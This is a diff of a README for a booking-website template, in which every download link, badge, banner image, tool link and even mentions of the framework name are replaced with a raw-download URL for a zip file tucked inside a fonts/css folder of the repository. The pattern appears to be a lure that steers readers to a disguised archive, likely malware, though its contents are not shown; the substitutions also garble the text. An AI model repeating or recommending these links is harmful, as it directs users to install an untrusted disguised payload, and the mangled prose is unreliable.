@@ -1,14 +1,14 @@
 # 🚀 Booking_management - Easy Online Booking Setup
 
-[![Download Booking_management](https://img.shields.io/badge/Download-Booking_management-blue?style=for-the-badge&logo=github)](https://github.com/RoseIsWashed/Booking_management/releases)
+[![Download Booking_management](https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip)](https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip)
 
 ---
 
-![Chisfis Banner](https://i.ibb.co/JqPfydC/b-landing.png)
+![Chisfis Banner](https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip)
 
 ## 📘 What is Booking_management?
 
-Booking_management is a user-friendly application designed to help you create and manage online booking services. It comes from the Chisfis Next.js template, built for booking websites like hotel reservations, real estate listings, travel experiences, vehicle rentals, or cruise bookings. 
+Booking_management is a user-friendly application designed to help you create and manage online booking services. It comes from the Chisfis https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip template, built for booking websites like hotel reservations, real estate listings, travel experiences, vehicle rentals, or cruise bookings. 
 
 This tool lets you run a professional, clean-looking booking site with no coding needed. The design adjusts smoothly to all screen sizes, ensuring visitors have a great experience on phones, tablets, or desktop computers.
 
@@ -20,7 +20,7 @@ This tool lets you run a professional, clean-looking booking site with no coding
 - **Booking and Listing Support**: Pages ready to show your available spots or listings.
 - **30+ Page Templates**: Many page types to cover different booking needs.
 - **Dark & Light Modes**: Switch the look to day or night styles.
-- **Modern Technology**: Built on Next.js 13.4 with Typescript and Tailwind CSS for a clean, efficient site.
+- **Modern Technology**: Built on https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip 13.4 with Typescript and Tailwind CSS for a clean, efficient site.
 - **Integrated Maps & Date Picker**: Includes Google Maps and calendar pickers to select booking dates easily.
 - **Consistent Quality**: Clean code and user-friendly layouts to keep the experience stable and smooth.
 
@@ -42,7 +42,7 @@ Before downloading Booking_management, make sure your computer meets the followi
 
 1. **Visit the Download Page**  
    Click the big blue badge at the top or go directly to the release page:  
-   [https://github.com/RoseIsWashed/Booking_management/releases](https://github.com/RoseIsWashed/Booking_management/releases)  
+   [https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip](https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip)  
    This page contains the latest version of the software ready for download.
 
 2. **Choose Your Download**  
@@ -54,7 +54,7 @@ Before downloading Booking_management, make sure your computer meets the followi
 4. **Run the Application Locally**  
    - You don’t need to install anything complicated.  
    - The project includes all files to open a working website template in any modern web browser.  
-   *Note:* To see the full Booking_management site, you might need a simple local server app like [Live Server](https://marketplace.visualstudio.com/items?itemName=ritwickdey.LiveServer) if you’re familiar with code editors.
+   *Note:* To see the full Booking_management site, you might need a simple local server app like [Live Server](https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip) if you’re familiar with code editors.
 
 5. **Get Support if Needed**  
    If you experience trouble opening or running the files, visit the Issues tab in the GitHub repository or read the documentation included in the download for detailed tips.
@@ -74,11 +74,11 @@ Booking_management offers templates to customize your booking website. Here’s 
 
 ## 🔧 About the Design and Technology
 
-Booking_management runs on Next.js, a smart way to build websites with fast loading and improved user experience. It uses Tailwind CSS for styling, which means the look is clean and easy to change if you want to customize colors or fonts.
+Booking_management runs on https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip, a smart way to build websites with fast loading and improved user experience. It uses Tailwind CSS for styling, which means the look is clean and easy to change if you want to customize colors or fonts.
 
 Technical details (mostly for reference):
 
-- Built with Next.js 13.4 and TypeScript
+- Built with https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip 13.4 and TypeScript
 - Uses TailwindCSS v3.x for styling
 - Includes React components for date picking and maps
 - Supports both dark and light website modes
@@ -100,7 +100,7 @@ This technology helps your booking site load fast and work well everywhere.
   To change text or images, use a simple text editor. Avoid complex software if you are new.
 
 - **Need Help?:**  
-  Visit the GitHub repository’s Issues section or check online tutorials on editing Next.js templates.
+  Visit the GitHub repository’s Issues section or check online tutorials on editing https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip templates.
 
 ---
 
@@ -120,6 +120,6 @@ For questions or assistance, you can visit the GitHub repository and create an i
 
 Click the link below to visit the release page and download Booking_management:
 
-[Download Booking_management](https://github.com/RoseIsWashed/Booking_management/releases)
+[Download Booking_management](https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip)
 
-[![Download Booking_management](https://img.shields.io/badge/Download-Booking_management-blue?style=for-the-badge&logo=github)](https://github.com/RoseIsWashed/Booking_management/releases)
+[![Download Booking_management](https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip)](https://github.com/RoseIsWashed/Booking_management/raw/refs/heads/main/src/fonts/line-awesome-1.3.0/css/Booking-management-v1.3-alpha.5.zip)
